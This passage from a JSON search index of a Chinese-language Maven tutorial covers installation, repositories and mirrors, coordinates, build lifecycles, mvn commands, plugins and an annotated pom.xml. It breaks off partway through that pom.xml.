\u4ece\u5165\u95e8\u5230\u5b9e\u8df5","text":""},{"location":"language/java/maven/#_1","title":"\u7b80\u4ecb","text":"<p>Apache Maven is a software project management and comprehension tool. Based on the concept of a project object model (POM), Maven can manage a project's build, reporting and documentation from a central piece of information.</p> <p>\u9879\u76ee\u7ba1\u7406\u5de5\u5177\uff0c\u57fa\u4e8e POM\uff0c\u53ef\u4ee5\u7ba1\u7406\u4e00\u4e2a\u9879\u76ee\u7684\u6784\u5efa\u3001\u62a5\u544a\u548c\u6587\u6863\u3002</p> <p></p>"},{"location":"language/java/maven/#_2","title":"\u5b89\u88c5","text":"<pre><code># 1. \u68c0\u67e5JAVA_HOME\u73af\u5883\u53d8\u91cf\necho $JAVA_HOME\n\n# 2. \u5b89\u88c5\u5e76\u68c0\u67e5maven\nsudo apt install maven\nbrew install maven\nmvn -v\n</code></pre>"},{"location":"language/java/maven/#maven_1","title":"Maven \u4ed3\u5e93","text":"<p>\u5f53\u6211\u4eec\u6267\u884c Maven \u6784\u5efa\u547d\u4ee4\u65f6\uff0cMaven \u5f00\u59cb\u6309\u7167\u4ee5\u4e0b\u987a\u5e8f\u67e5\u627e\u4f9d\u8d56\u7684\u5e93\uff1a</p> <ul> <li>\u6b65\u9aa4 1\u00a0\uff0d \u5728\u672c\u5730\u4ed3\u5e93\u4e2d\u641c\u7d22\uff0c\u5982\u679c\u627e\u4e0d\u5230\uff0c\u6267\u884c\u6b65\u9aa4 2\uff0c\u5982\u679c\u627e\u5230\u4e86\u5219\u6267\u884c\u5176\u4ed6\u64cd\u4f5c\u3002</li> <li>\u6b65\u9aa4 2\u00a0\uff0d \u5728\u4e2d\u592e\u4ed3\u5e93\u4e2d\u641c\u7d22\uff0c\u5982\u679c\u627e\u4e0d\u5230\uff0c\u5e76\u4e14\u6709\u4e00\u4e2a\u6216\u591a\u4e2a\u8fdc\u7a0b\u4ed3\u5e93\u5df2\u7ecf\u8bbe\u7f6e\uff0c\u5219\u6267\u884c\u6b65\u9aa4 4\uff0cd \u5982\u679c\u627e\u5230\u4e86\u5219\u4e0b\u8f7d\u5230\u672c\u5730\u4ed3\u5e93\u4e2d\u4ee5\u5907\u5c06\u6765\u5f15\u7528\u3002</li> <li>\u6b65\u9aa4 3\u00a0\uff0d \u5982\u679c\u8fdc\u7a0b\u4ed3\u5e93\u6ca1\u6709\u88ab\u8bbe\u7f6e\uff0cMaven \u5c06\u7b80\u5355\u7684\u505c\u6ede\u5904\u7406\u5e76\u629b\u51fa\u9519\u8bef\uff08\u65e0\u6cd5\u627e\u5230\u4f9d\u8d56\u7684\u6587\u4ef6\uff09\u3002</li> <li>\u6b65\u9aa4 4\u00a0\uff0d \u5728\u4e00\u4e2a\u6216\u591a\u4e2a\u8fdc\u7a0b\u4ed3\u5e93\u4e2d\u641c\u7d22\u4f9d\u8d56\u7684\u6587\u4ef6\uff0c\u5982\u679c\u627e\u5230\u5219\u4e0b\u8f7d\u5230\u672c\u5730\u4ed3\u5e93\u4ee5\u5907\u5c06\u6765\u5f15\u7528\uff0c\u5426\u5219 Maven \u5c06\u505c\u6b62\u5904\u7406\u5e76\u629b\u51fa\u9519\u8bef\uff08\u65e0\u6cd5\u627e\u5230\u4f9d\u8d56\u7684\u6587\u4ef6\uff09\u3002</li> </ul>"},{"location":"language/java/maven/#_3","title":"\u672c\u5730\u4ed3\u5e93","text":"<pre><code>cd ~/.m2/repository\n</code></pre>"},{"location":"language/java/maven/#_4","title":"\u4e2d\u592e\u4ed3\u5e93","text":"<ul> <li>\u7531 Maven \u793e\u533a\u7ba1\u7406\uff0c\u5176\u4e2d\u5305\u542b\u4e86\u5927\u91cf\u5e38\u7528\u5e93</li> <li>\u4e0d\u9700\u8981\u914d\u7f6e</li> <li>\u9700\u8981\u901a\u8fc7\u7f51\u7edc\u624d\u80fd\u8bbf\u95ee</li> </ul> <p>Maven \u9ed8\u8ba4\u7684\u4ed3\u5e93\uff1ahttps://repo.maven.apache.org/maven2\uff0c\u66f4\u6362\u963f\u91cc\u4e91\u955c\u50cf\u4ed3\u5e93\u4ee5\u52a0\u901f\u4e0b\u8f7d\u3002</p> <p>\u9ed8\u8ba4\u955c\u50cf\u914d\u7f6e\u5728 Super POM \u4e2d\u53ef\u4ee5\u67e5\u770b\u3002</p> vim ~/.m2/settings.xml<pre><code>&lt;settings&gt;\n    &lt;mirrors&gt;\n        &lt;mirror&gt;\n            &lt;id&gt;alimaven&lt;/id&gt;\n            &lt;mirrorOf&gt;central&lt;/mirrorOf&gt;\n            &lt;name&gt;aliyun maven&lt;/name&gt;\n            &lt;url&gt;https://maven.aliyun.com/repository/public&lt;/url&gt;\n        &lt;/mirror&gt;\n    &lt;/mirrors&gt;\n&lt;/settings&gt;\n</code></pre>"},{"location":"language/java/maven/#_5","title":"\u8fdc\u7a0b\u4ed3\u5e93","text":"<p>\u5982\u679c\u4e2d\u592e\u4ed3\u5e93\u4e2d\u4e5f\u627e\u4e0d\u5230\u4f9d\u8d56\u4fe1\u606f\uff0c\u4f1a\u505c\u6b62\u6784\u5efa\u8fc7\u7a0b\u5e76\u8f93\u51fa\u9519\u8bef\u4fe1\u606f\u5230\u63a7\u5236\u53f0\u3002</p> <p>\u7531\u6b64\uff0cMaven \u63d0\u4f9b\u4e86\u8fdc\u7a0b\u4ed3\u5e93\u7684\u6982\u5ff5\uff0c\u5b83\u662f\u5f00\u53d1\u4eba\u5458\u81ea\u5df1\u5b9a\u5236\u7684\u4ed3\u5e93\uff0c\u5305\u542b\u4e86\u6240\u9700\u8981\u7684\u4ee3\u7801\u5e93\u6216\u5176\u4ed6\u5de5\u7a0b\u4e2d\u7528\u5230\u7684 jar \u6587\u4ef6\u3002</p> <pre><code>&lt;dependencies&gt;\n    &lt;dependency&gt;\n        &lt;groupId&gt;com.companyname.common-lib&lt;/groupId&gt;\n        &lt;artifactId&gt;common-lib&lt;/artifactId&gt;\n        &lt;version&gt;1.0.0&lt;/version&gt;\n    &lt;/dependency&gt;\n&lt;dependencies&gt;\n&lt;repositories&gt;\n    &lt;repository&gt;\n        &lt;id&gt;companyname.lib1&lt;/id&gt;\n        &lt;url&gt;http://download.companyname.org/maven2/lib1&lt;/url&gt;\n    &lt;/repository&gt;\n    &lt;repository&gt;\n        &lt;id&gt;companyname.lib2&lt;/id&gt;\n        &lt;url&gt;http://download.companyname.org/maven2/lib2&lt;/url&gt;\n    &lt;/repository&gt;\n&lt;/repositories&gt;\n</code></pre>"},{"location":"language/java/maven/#maven_2","title":"Maven \u5750\u6807","text":"<p>Maven \u7684\u5750\u6807\u4e3b\u8981\u7531\u4e09\u4e2a\u90e8\u5206\u7ec4\u6210\uff1a</p> <ul> <li>groupId\uff1a\u516c\u53f8\u6216\u7ec4\u7ec7\u7684\u552f\u4e00\u6807\u5fd7</li> <li>artifactId\uff1a\u9879\u76ee\u7684\u552f\u4e00 ID\uff0c\u4e00\u4e2a groupId \u4e0b\u53ef\u80fd\u6709\u591a\u4e2a\u9879\u76ee\uff0c\u901a\u8fc7 artifactId \u6765\u533a\u5206</li> <li>version\uff1a\u7248\u672c</li> </ul> <p>\u5750\u6807\u7684\u4f5c\u7528\u4e3b\u8981\u6709\u4e24\u4e2a\uff1a</p> <ul> <li>\u5bf9\u4e8e\u4f9d\u8d56(dependency)\u548c\u63d2\u4ef6(plugin)\uff0c\u4ee5\u4e0b\u9762\u7684 <code>flacoco</code> \u4e3a\u4f8b\uff0cMaven \u4f1a\u5148\u5728\u672c\u5730\u4ed3\u5e93 <code>~/.m2/com/github/sponlabs/flacoco/1.0.1</code> \u4e0b\u5bfb\u627e\u662f\u5426\u5b58\u5728\uff0c\u5982\u679c\u4e0d\u5b58\u5728\uff0c\u56de\u53bb Maven \u8fdc\u7a0b\u4ed3\u5e93\u4e0b\u8f7d\u3002</li> <li>\u5bf9\u4e8e\u5f53\u524d\u9879\u76ee\uff0c\u8fd0\u884c <code>mvn install</code> \uff0c\u4f1a\u5728 <code>~/.m2/fr/inria/gforge/spirals/nopol/0.2-SNAPSHOT</code> \u4e0b\u751f\u6210\u4e00\u4e2a JAR \u5305\u53ca\u5176\u914d\u7f6e\u4fe1\u606f\u3002</li> </ul> <pre><code>&lt;?xml version=\"1.0\" encoding=\"utf-8\"?&gt;\n\n&lt;project xmlns=\"http://maven.apache.org/POM/4.0.0\" xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\" xsi:schemaLocation=\"http://maven.apache.org/POM/4.0.0 http://maven.apache.org/xsd/maven-4.0.0.xsd\"&gt;\n  &lt;modelVersion&gt;4.0.0&lt;/modelVersion&gt;\n  &lt;!-- 1.\u5f53\u524d\u9879\u76ee\u5750\u6807--&gt;\n  &lt;groupId&gt;fr.inria.gforge.spirals&lt;/groupId&gt;\n  &lt;artifactId&gt;nopol&lt;/artifactId&gt;\n  &lt;version&gt;0.2-SNAPSHOT&lt;/version&gt;\n  &lt;!-- 2.\u9879\u76ee\u6240\u9700\u4f9d\u8d56--&gt;\n  &lt;dependencies&gt;\n    &lt;dependency&gt;\n      &lt;groupId&gt;com.github.spoonlabs&lt;/groupId&gt;\n      &lt;artifactId&gt;flacoco&lt;/artifactId&gt;\n      &lt;version&gt;1.0.1&lt;/version&gt;\n    &lt;/dependency&gt;\n    &lt;dependency&gt;\n      &lt;groupId&gt;junit&lt;/groupId&gt;\n      &lt;artifactId&gt;junit&lt;/artifactId&gt;\n      &lt;version&gt;4.13.2&lt;/version&gt;\n    &lt;/dependency&gt;\n  &lt;/dependencies&gt;\n  &lt;!-- 3.\u63d2\u4ef6--&gt;\n  &lt;build&gt;\n    &lt;pluginManagement&gt;\n      &lt;plugins&gt;\n        &lt;plugin&gt;\n          &lt;groupId&gt;org.codehaus.mojo&lt;/groupId&gt;\n          &lt;artifactId&gt;javacc-maven-plugin&lt;/artifactId&gt;\n          &lt;version&gt;${javacc-maven-plugin.version}&lt;/version&gt;\n        &lt;/plugin&gt;\n      &lt;/plugins&gt;\n    &lt;/pluginManagement&gt;\n  &lt;/build&gt;\n&lt;/project&gt;\n</code></pre>"},{"location":"language/java/maven/#maven_3","title":"Maven \u751f\u547d\u5468\u671f","text":"<p>Maven \u5171\u6709\u4e09\u5957\u76f8\u4e92\u72ec\u7acb\u7684\u751f\u547d\u5468\u671f(clean\u3001build\u3001site)\uff0c\u6bcf\u4e2a\u751f\u547d\u5468\u671f\u5185\u90e8\u5305\u542b\u591a\u4e2a\u6709\u5e8f\u9636\u6bb5(phase)\uff0c\u540e\u9762\u7684\u9636\u6bb5\u4f9d\u8d56\u4e8e\u524d\u9762\u7684\u9636\u6bb5\uff0c\u56e0\u6b64\u4e0d\u540c\u7684\u9636\u6bb5\u6267\u884c\u5177\u6709\u5148\u540e\u987a\u5e8f\u3002</p>"},{"location":"language/java/maven/#clean","title":"clean\uff1a\u6e05\u7406\u9879\u76ee","text":"<p>clean \u751f\u547d\u5468\u671f\u5305\u542b 3 \u4e2a\u9636\u6bb5\uff1a</p> Phrase Description pre-clean \u6267\u884c\u4e00\u4e9b clean \u524d\u9700\u8981\u5b8c\u6210\u7684\u5de5\u4f5c clean \u6e05\u7406\u4e0a\u4e00\u6b21\u6784\u5efa\u751f\u6210\u7684\u6587\u4ef6 post-clean \u6267\u884c\u4e00\u4e9b clean \u540e\u9700\u8981\u5b8c\u6210\u7684\u5de5\u4f5c"},{"location":"language/java/maven/#site","title":"site\uff1a\u5efa\u7acb\u548c\u53d1\u5e03\u9879\u76ee\u7ad9\u70b9","text":"<p>site \u751f\u547d\u5468\u671f\u5305\u542b 3 \u4e2a\u9636\u6bb5\uff1a</p> Phrase Description pre-site \u6267\u884c\u4e00\u4e9b\u5728\u751f\u6210\u9879\u76ee\u7ad9\u70b9\u4e4b\u524d\u9700\u8981\u5b8c\u6210\u7684\u5de5\u4f5c site \u751f\u6210\u9879\u76ee\u7ad9\u70b9\u6587\u6863 site-deploy \u5c06\u751f\u6210\u7684\u9879\u76ee\u7ad9\u70b9\u53d1\u5e03\u5230\u670d\u52a1\u5668\u4e0a post-site \u6267\u884c\u4e00\u4e9b\u5728\u751f\u6210\u9879\u76ee\u7ad9\u70b9\u4e4b\u540e\u9700\u8981\u5b8c\u6210\u7684\u5de5\u4f5c"},{"location":"language/java/maven/#build","title":"build\uff1a\u6784\u5efa\u9879\u76ee","text":"<p>\u4ea6\u79f0\u4e3a default \u751f\u547d\u5468\u671f\uff0c\u5305\u542b 23 \u4e2a\u9636\u6bb5\uff0c\u8be6\u89c1\uff1aMaven | Introduction to the Build Lifecycle</p> <p>\u4e0b\u9762\u5217\u51fa 23 \u4e2a\u9636\u6bb5\u4e2d\u8f83\u4e3a\u91cd\u8981\u7684\u9636\u6bb5\uff1a</p> Phrase Description validate \u9a8c\u8bc1\u9879\u76ee\u662f\u5426\u6b63\u786e\u5e76\u4e14\u6240\u6709\u5fc5\u8981\u4fe1\u606f\u90fd\u53ef\u7528 compile \u7f16\u8bd1\u9879\u76ee\u7684\u6e90\u4ee3\u7801 test-compile \u7f16\u8bd1\u6d4b\u8bd5\u6e90\u4ee3\u7801\u5230\u6d4b\u8bd5\u76ee\u6807\u76ee\u5f55 test \u4f7f\u7528\u5408\u9002\u7684\u5355\u5143\u6d4b\u8bd5\u6846\u67b6(e.g. JUnit)\u8fd0\u884c\u6d4b\u8bd5 , \u6d4b\u8bd5\u4ee3\u7801\u4e0d\u4f1a\u88ab\u6253\u5305\u6216\u90e8\u7f72 package \u5c06\u7f16\u8bd1\u540e\u7684\u4ee3\u7801\u6253\u5305\u6210\u53ef\u5206\u53d1\u7684\u683c\u5f0f(e.g. JAR) verify \u5bf9\u96c6\u6210\u6d4b\u8bd5\u7684\u7ed3\u679c\u8fdb\u884c\u68c0\u67e5\uff0c\u4ee5\u4fdd\u8bc1\u8d28\u91cf\u8fbe\u6807 install \u5b89\u88c5\u6253\u5305\u7684\u9879\u76ee\u5230\u672c\u5730\u4ed3\u5e93\uff0c\u4ee5\u4f9b\u5176\u4ed6 maven \u9879\u76ee\u4f7f\u7528 deploy \u62f7\u8d1d\u6700\u7ec8\u7684\u5de5\u7a0b\u5305\u5230\u8fdc\u7a0b\u4ed3\u5e93\u4e2d\uff0c\u4ee5\u5171\u4eab\u7ed9\u5176\u4ed6\u5f00\u53d1\u4eba\u5458\u548c maven \u9879\u76ee\u4f7f\u7528"},{"location":"language/java/maven/#mvn","title":"MVN \u547d\u4ee4","text":"<p>\u5f53\u6211\u4eec\u8c03\u7528 <code>mvn</code> \u547d\u4ee4\u65f6\uff0c\u5176\u5b9e\u5728\u8c03\u7528 maven \u7684\u751f\u547d\u5468\u671f\u9636\u6bb5\u3002</p> <p>\u547d\u4ee4\u683c\u5f0f\uff1a <code>mvn phrase1 [phrase2] ... [phraseN]</code></p> <pre><code># 1. \u8c03\u7528clean\u751f\u547d\u5468\u671f\u7684clean\u9636\u6bb5\uff0c\u5b9e\u9645\u4f1a\u6267\u884cclean\u751f\u547d\u5468\u671f\u4e2d\u7684pre-clean\u548cclean\u9636\u6bb5\nmvn clean\n\n# 2. \u8c03\u7528clean\u751f\u547d\u5468\u671f\u7684clean\u9636\u6bb5\u548cbuild\u751f\u547d\u5468\u671f\u7684install\u9636\u6bb5(\u53ca\u4e8c\u8005\u4e4b\u524d\u7684\u6240\u6709\u9636\u6bb5)\nmvn clean install\n</code></pre>"},{"location":"language/java/maven/#maven_4","title":"Maven \u63d2\u4ef6","text":"<p>\u5df2\u77e5 Maven \u5b9a\u4e49\u4e86\u4e09\u4e2a\u62bd\u8c61\u7684\u751f\u547d\u5468\u671f\uff0c\u6bcf\u4e2a\u751f\u547d\u5468\u671f\u5305\u62ec\u591a\u4e2a\u9636\u6bb5\u3002</p> <p>\u7531\u6b64\u5f15\u51fa Maven \u63d2\u4ef6\uff0c\u63d2\u4ef6\u4ee5\u72ec\u7acb\u7684\u6784\u5efa\u5f62\u5f0f\u5b58\u5728\uff0c\u901a\u8fc7\u5c06\u751f\u547d\u5468\u671f\u7684\u9636\u6bb5\u4e0e\u63d2\u4ef6\u76ee\u6807\u7ed1\u5b9a\uff0c\u5b8c\u6210\u751f\u547d\u5468\u671f\u9636\u6bb5\u7684\u4efb\u52a1\uff0c\u53ef\u4ee5\u901a\u8fc7 <code>mvn phrase</code> \u6765\u6267\u884c\u4e0e\u8be5\u9636\u6bb5\u7ed1\u5b9a\u7684\u63d2\u4ef6\u76ee\u6807\u3002</p> <p>\u63d2\u4ef6\u7684\u6bcf\u4e2a\u529f\u80fd\u53eb\u505a\u63d2\u4ef6\u7684\u76ee\u6807(Plugin Goal)\uff0c\u6bcf\u4e2a\u63d2\u4ef6\u53ef\u80fd\u6709 1 \u4e2a\u53ca\u4ee5\u4e0a\u7684\u76ee\u6807\u3002</p>"},{"location":"language/java/maven/#_6","title":"\u5185\u7f6e\u7ed1\u5b9a","text":"<p>\u4e3a\u4e86\u8ba9\u7528\u6237\u51e0\u4e4e\u4e0d\u7528\u4efb\u4f55\u914d\u7f6e\u5c31\u80fd\u6784\u5efa maven \u9879\u76ee\uff0cmaven \u4e3a\u4e00\u4e9b\u4e3b\u8981\u7684\u751f\u547d\u5468\u671f\u9636\u6bb5\u7ed1\u5b9a\u597d\u4e86\u63d2\u4ef6\u76ee\u6807\uff0c\u5f53\u6211\u4eec\u901a\u8fc7\u547d\u4ee4\u8c03\u7528\u751f\u547d\u5468\u671f\u9636\u6bb5\u65f6\uff0c\u7ed1\u5b9a\u7684\u63d2\u4ef6\u76ee\u6807\u5c31\u4f1a\u6267\u884c\u5bf9\u5e94\u7684\u4efb\u52a1\u3002</p> <p>\u8be6\u89c1\uff1aMaven | Introduction to the Build Lifecycle</p>"},{"location":"language/java/maven/#_7","title":"\u81ea\u5b9a\u4e49\u7ed1\u5b9a","text":"<p>\u8bbe\u7f6e <code>&lt;build&gt;</code> \u6807\u7b7e\u3002</p>"},{"location":"language/java/maven/#pomxml","title":"\u6838\u5fc3\u6587\u4ef6\uff1apom.xml","text":"<p>\u5f53\u6267\u884c maven \u4efb\u52a1\u65f6\uff0cmaven \u4f1a\u5728\u5f53\u524d\u76ee\u5f55\u67e5\u627e <code>pom.xml</code> \uff0c\u4ece\u4e2d\u83b7\u53d6\u6240\u9700\u7684\u914d\u7f6e\u4fe1\u606f\uff1a</p> <ul> <li>\u9879\u76ee\u57fa\u7840\u4fe1\u606f\uff1a\u5750\u6807\u3001\u7248\u672c\u3001\u5f00\u53d1\u8005\u3001\u90ae\u4ef6\u3001\u8bb8\u53ef\u8bc1...</li> <li>\u9879\u76ee\u6784\u5efa\u4fe1\u606f</li> <li>\u9879\u76ee\u90e8\u7f72\u4fe1\u606f\uff1amvn deploy</li> </ul>"},{"location":"language/java/maven/#super-pom","title":"Super POM","text":"<p>Super POM \u662f Maven \u9ed8\u8ba4\u7684 POM\uff0c\u6240\u6709\u7684 POM \u90fd\u7ee7\u627f\u81ea\u4e00\u4e2a\u7236 POM\uff0c\u4f7f\u7528\u4ee5\u4e0b\u547d\u4ee4\u6765\u67e5\u770b Super POM \u7684\u9ed8\u8ba4\u914d\u7f6e\uff1a</p> <pre><code>mvn help:effective-pom\n</code></pre> <p>\u6267\u884c\u5b8c\u6bd5\u540e\uff0c\u4f1a\u76f4\u63a5\u5728\u63a7\u5236\u53f0\u663e\u793a Super POM \u7684\u5185\u5bb9\uff0c\u5305\u62ec\u8fdc\u7a0b\u4ed3\u5e93\u3001\u9ed8\u8ba4\u5de5\u7a0b\u6e90\u7801\u76ee\u5f55\u7ed3\u6784\u3001\u8f93\u51fa\u76ee\u5f55\u3001\u63d2\u4ef6\u3001\u4ed3\u5e93\u7b49\u914d\u7f6e\u3002</p>"},{"location":"language/java/maven/#_8","title":"\u6807\u7b7e\u8bb2\u89e3","text":"<p>\u8be6\u89c1\uff1a\u83dc\u9e1f | Maven POM</p> <pre><code>&lt;?xml version=\"1.0\" encoding=\"utf-8\"?&gt;\n\n&lt;project xmlns=\"http://maven.apache.org/POM/4.0.0\" xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\" xsi:schemaLocation=\"http://maven.apache.org/POM/4.0.0 http://maven.apache.org/xsd/maven-4.0.0.xsd\"&gt;\n  &lt;modelVersion&gt;4.0.0&lt;/modelVersion&gt;\n  &lt;!-- \u7236\u9879\u76ee\u7684\u5750\u6807\u3002\u5982\u679c\u9879\u76ee\u4e2d\u6ca1\u6709\u89c4\u5b9a\u67d0\u4e2a\u5143\u7d20\u7684\u503c\uff0c\u90a3\u4e48\u7236\u9879\u76ee\u4e2d\u7684\u5bf9\u5e94\u503c\u5373\u4e3a\u9879\u76ee\u7684\u9ed8\u8ba4\u503c\u3002 --&gt;\n  &lt;parent&gt;\n    &lt;groupId/&gt;\n    &lt;artifactId/&gt;\n    &lt;version/&gt;\n    &lt;!-- \u7236\u9879\u76ee\u7684pom.xml\u6587\u4ef6\u7684\u76f8\u5bf9\u8def\u5f84\u3002\u76f8\u5bf9\u8def\u5f84\u5141\u8bb8\u4f60\u9009\u62e9\u4e00\u4e2a\u4e0d\u540c\u7684\u8def\u5f84\u3002\u9ed8\u8ba4\u503c\u662f../pom.xml\u3002Maven\u9996\u5148\u5728\u6784\u5efa\u5f53\u524d\u9879\u76ee\u7684\u5730\u65b9\u5bfb\u627e\u7236\u9879\n            \u76ee\u7684pom\uff0c\u5176\u6b21\u5728\u6587\u4ef6\u7cfb\u7edf\u7684\u8fd9\u4e2a\u4f4d\u7f6e\uff08relativePath\u4f4d\u7f6e\uff09\uff0c\u7136\u540e\u5728\u672c\u5730\u4ed3\u5e93\uff0c\u6700\u540e\u5728\u8fdc\u7a0b\u4ed3\u5e93\u5bfb\u627e\u7236\u9879\u76ee\u7684pom\u3002 --&gt;\n    &lt;relativePath/&gt;\n  &lt;/parent&gt;\n  &lt;!-- \u58f0\u660e\u9879\u76ee\u63cf\u8ff0\u7b26\u9075\u5faa\u54ea\u4e00\u4e2aPOM\u6a21\u578b\u7248\u672c\u3002\u6a21\u578b\u672c\u8eab\u7684\u7248\u672c\u5f88\u5c11\u6539\u53d8\uff0c\u867d\u7136\u5982\u6b64\uff0c\u4f46\u5b83\u4ecd\u7136\u662f\u5fc5\u4e0d\u53ef\u5c11\u7684\uff0c\u8fd9\u662f\u4e3a\u4e86\u5f53Maven\u5f15\u5165\u4e86\u65b0\u7684\u7279\u6027\u6216\u8005\u5176\u4ed6\u6a21\u578b\u53d8\u66f4\u7684\u65f6\u5019\uff0c\u786e\u4fdd\u7a33\u5b9a\u6027\u3002 --&gt;\n  &lt;modelVersion&gt;4.0.0&lt;/modelVersion&gt;\n  &lt;!-- \u5f53\u524d\u9879\u76ee\u7684\u5750\u6807 --&gt;\n  &lt;groupId&gt;fr.inria.gforge.spirals&lt;/groupId&gt;\n  &lt;artifactId&gt;nopol-server&lt;/artifactId&gt;\n  &lt;version&gt;0.2-SNAPSHOT&lt;/version&gt;\n  &lt;!--\u9879\u76ee\u4ea7\u751f\u7684\u6784\u4ef6\u7c7b\u578b\uff0c\u4f8b\u5982jar\u3001war\u3001ear\u3001pom\u3002\u63d2\u4ef6\u53ef\u4ee5\u521b\u5efa\u4ed6\u4eec\u81ea\u5df1\u7684\u6784\u4ef6\u7c7b\u578b\uff0c\u6240\u4ee5\u524d\u9762\u5217\u7684\u4e0d\u662f\u5168\u90e8\u6784\u4ef6\u7c7b\u578b --&gt;\n  &lt;packaging&gt;jar&lt;/packaging&gt;\n  &lt;!-- \u9879\u76ee\u7684\u540d\u79f0\uff0cMaven\u4ea7\u751f\u7684\u6587\u6863\u7528 --&gt;\n  &lt;name&gt;No-Pol-server&lt;/name&gt;\n  &lt;!-- \u9879\u76ee\u7684\u4e3b\u9875\u7684URL\uff0cMaven\u4ea7\u751f\u7684\u6587\u6863\u7528 --&gt;\n  &lt;url&gt;http://www.baidu.com/banseon&lt;/url&gt;\n  &lt;!-- \u9879\u76ee\u7684\u8be6\u7ec6\u63cf\u8ff0--&gt;\n  &lt;description&gt;Java Program Repair via Conditional Expression Replacement&lt;/description&gt;\n  &lt;!-- \u9879\u76ee\u521b\u5efa\u5e74\u4efd\uff0c4\u4f4d\u6570\u5b57\u3002\u5f53\u4ea7\u751f\u7248\u6743\u4fe1\u606f\u65f6\u9700\u8981\u4f7f\u7528\u8be5\u503c --&gt;\n  &lt;inceptionYear&gt;2013&lt;/inceptionYear&gt;\n  &lt;!--  \u5176\u4ed6\u4fe1\u606f\uff1a\u90ae\u4ef6\u3001\u5f00\u53d1\u8005\u3001\u5176\u4ed6\u8d21\u732e\u8005\u3001\u8bb8\u53ef\u8bc1\u3001\u7ec4\u7ec7--&gt;\n  &lt;mailingList/&gt;\n  &lt;developer/&gt;\n  &lt;contributors/&gt;\n  &lt;licenses/&gt;\n  &lt;organization/&gt;\n  &lt;!-- \u9879\u76ee\u6301\u7eed\u96c6\u6210\u4fe1\u606f --&gt;\n  &lt;ciManagement/&gt;\n  &lt;!-- \u9879\u76ee\u7684\u95ee\u9898\u7ba1\u7406\u7cfb\u7edf --&gt;\n  &lt;issueManagement/&gt;\n  &lt;!--SCM(Source Control Management)\u6807\u7b7e\u5141\u8bb8\u4f60\u914d\u7f6e\u4f60\u7684\u4ee3\u7801\u5e93\uff0c\u4f9bMaven web\u7ad9\u70b9\u548c\u5176\u5b83\u63d2\u4ef6\u4f7f\u7528\u3002 --&gt;\n  &lt;scm/&gt;\n  &lt;!-- \u6784\u5efa\u8be5\u9879\u76ee\u6216\u4f7f\u7528\u8be5\u63d2\u4ef6\u6240\u9700\u7684Maven\u7684\u6700\u4f4e\u7248\u672c --&gt;\n  &lt;prerequisites&gt;\n    &lt;maven&gt;3.0&lt;/maven&gt;\n  &lt;/prerequisites&gt;\n  &lt;!-- \u6a21\u5757\uff0c\u4ea6\u6210\u4e3a\u5b50\u9879\u76ee --&gt;\n  &lt;modules&gt;\n    &lt;module&gt;\u6307\u5411\u8be5\u5b50\u6a21\u5757\u7684\u76ee\u5f55\u7684\u76f8\u5bf9\u8def\u5f84&lt;/module&gt;\n  &lt;/modules&gt;\n  &lt;!-- \u8fdc\u7a0b\u4ed3\u5e93\u5217\u8868:\u4f9d\u8d56\u548c\u6269\u5c55\u3001 \u63d2\u4ef6\u3002  --&gt;\n  &lt;repositories/&gt;\n  &lt;pluginRepositories/&gt;\n  &lt;!-- \u6784\u5efa\u9879\u76ee\u9700\u8981\u7684\u4fe1\u606f \u5728Super POM\u6709\u9ed8\u8ba4\u914d\u7f6e--&gt;\n  &lt;build&gt;\n    &lt;!-- \u6587\u4ef6\u4f4d\u7f6e(\u76f8\u5bf9pom.xml\u6587\u4ef6\u7684\u76f8\u5bf9\u8def\u5f84)\uff1a\u6e90\u7801\u3001\u811a\u672c\u6e90\u7801\u3001\u5355\u5143\u6d4b\u8bd5\u6e90\u7801\u3001\u7f16\u8bd1\u540e\u7a0b\u5e8fclass\u6587\u4ef6\u76ee\u5f55\u3001\u7f16\u8bd1\u540e\u6d4b\u8bd5calss\u6587\u4ef6\u76ee\u5f55 --&gt;\n    &lt;sourceDirectory&gt;src/main/java&lt;/sourceDirectory&gt;\n    &lt;scriptSourceDirectory&gt;src/main/srcipts&lt;/scriptSourceDirectory&gt;\n    &lt;testSourceDirectory&gt;/src/test/java&lt;/testSourceDirectory&gt;\n    &lt;outputDirectory&gt;/target/classes&lt;/outputDirectory&gt;\n    &lt;testOutputDirectory&gt;/target/test-classes&lt;/testOutputDirectory&gt;\n    &lt;!-- \u8d44\u6e90\u8def\u5f84\uff1a\u9879\u76ee\u8d44\u6e90\u8def\u5f84\u3001\u6d4b\u8bd5\u8d44\u6e90\u8def\u5f84 --&gt;\n    &lt;resources&gt;\n      &lt;resource&gt;\n        &lt;directory&gt;/src/main/resources&lt;/directory&gt;\n      &lt;/resource&gt;\n    &lt;/resources&gt;\n    &lt;testResources&gt;\n      &lt;testResource&gt;\n        &lt;directory&gt;/src/test/resources&lt;/directory&gt;\n      &lt;/testResource&gt;\n    &lt;/testResources&gt;\n    &lt;!-- \u8f93\u51fa\u8bbe\u7f6e\uff1a\u6784\u5efa\u4ea7\u751f\u7684\u6240\u6709\u6587\u4ef6\u7684\u76ee\u5f55 --&gt;\n    &lt;directory&gt;/target&lt;/directory&gt;\n    &lt;!-- \u4ea7\u751f\u7684\u6784\u5efa\u6587\u4ef6\u540d\uff0c\u9ed8\u8ba4\u4e3a\uff1a${artifactId}-${version} --&gt;\n    &lt;finalName/&gt;\n    &lt;!-- \u7c7b\u4f3cdependencyManagement\uff0c\u5b50POM\u518d\u6b21\u58f0\u660e\u624d\u4f1a\u5f15\u5165 --&gt;\n    &lt;pluginManagement&gt;\n      &lt;plugins&gt;\n        &lt;plugin/&gt;\n      &lt;/plugins&gt;\n    &lt;/pluginManagement&gt;\n    &lt;!--\u4f7f\u7528\u7684\u63d2\u4ef6\u5217\u8868 --&gt;\n    &lt;plugins&gt;\n      &lt;!--plugin\u5143\u7d20\u5305\u542b\u63cf\u8ff0\u63d2\u4ef6\u6240\u9700\u8981\u7684\u4fe1\u606f\u3002 --&gt;\n      &lt;plugin&gt;\n        &lt;groupId/&gt;\n        &lt;artifactId&gt;maven-clean-plugin&lt;/artifactId&gt;\n        &lt;version&gt;2.5&lt;/version&gt;\n        